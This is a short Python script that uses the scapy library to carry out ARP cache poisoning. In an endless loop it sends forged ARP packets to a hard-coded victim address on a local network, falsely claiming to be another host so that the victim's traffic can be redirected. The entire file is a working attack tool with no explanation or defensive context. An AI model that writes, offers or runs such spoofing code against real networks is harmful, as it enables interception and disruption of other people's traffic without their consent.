#!/usr/bin/env python
#
# Execute with sudo python arppoison.py
#
#
from scapy.all import *
import time

op=1 # Op code 1 for ARP requests
victim='192.168.0.223'
spoof='192.168.0.4'
mac='00:50:56:b2:78:5a'
arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
while 1:
 send(arp)
 time.sleep(1)
